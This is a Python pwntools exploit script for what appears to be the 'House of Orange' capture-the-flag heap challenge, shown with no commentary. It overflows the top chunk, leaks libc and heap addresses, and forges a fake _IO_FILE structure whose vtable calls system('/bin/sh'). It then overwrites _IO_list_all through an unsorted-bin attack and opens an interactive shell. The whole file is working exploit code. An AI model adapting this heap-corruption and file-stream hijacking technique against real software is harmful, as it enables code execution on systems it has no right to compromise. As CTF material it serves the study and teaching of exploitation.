from pwn import *

p = process("./house_of_orange")
e = ELF("./house_of_orange")
l = e.libc

def Build(size,name,price,color):
	p.recvuntil("choice : ")
	p.sendline("1")
	p.recvuntil(":")
	p.send(str(size))
	p.recvuntil(":")
	p.send(name)
	p.recvuntil(":")
	p.send(price)
	p.recvuntil(":")
	p.sendline(color)

def See():
	p.recvuntil("choice : ")
	p.sendline("2")

def Upgrade(size,name,price,color):
	p.recvuntil("choice : ")
	p.sendline("3")
	p.recvuntil(":")
	p.send(str(size))
	p.recvuntil(":")
	p.send(name)
	p.recvuntil(":")
	p.send(price)
	p.recvuntil(":")
	p.send(color)

Build(24,"A"*8,"11","1")
Upgrade(400,"B"*24+p64(0x21)+p64(0)*3+p64(0xfa1),"12","2")

Build(0x1000,"C"*8,"12","2")
Build(0x400,"A"*8,"11","1")

See()

p.recvuntil("A"*8)

leak = u64(p.recv(6).ljust(8,"\x00")) - 0x610
log.info("leak = "+str(hex(leak)))

libc_base = leak - 0x3c4b20 - 0x58
log.info("libc_base = "+str(hex(libc_base)))

system = libc_base + l.symbols['system']
log.info("system = "+str(hex(system)))

_IO_list_all = libc_base + l.symbols['_IO_list_all']
log.info("_IO_list_all = "+str(hex(_IO_list_all)))

Upgrade(0x20,"C"*0x10,"11","2")
See()

p.recvuntil("C"*0x10)

heap = u64(p.recv(6).ljust(8,"\x00"))
log.info("heap = "+str(hex(heap)))

fake = heap + 0x430

pay = "A"*0x410
pay += p32(0x64) + p32(0x1f) + p64(0)
pay += "/bin/sh\00" + p64(0x61)#prev_size, size
pay += p64(0x12345678) + p64(_IO_list_all - 0x10)#fd, bk
pay += p64(2) + p64(3) + p64(0)*9#_IO_write_base, _IO_write,ptr etc...
pay += p64(system)#save system into fake
pay += p64(0)*4#etc....
pay += p64(fake + 0x90) + p64(3) + p64(4) + p64(0) + p64(0) + p64(0)*2 + p64(fake + 0x60)#wide_data,_mode,vtable

Upgrade(len(pay),pay,"11","2")
p.interactive()
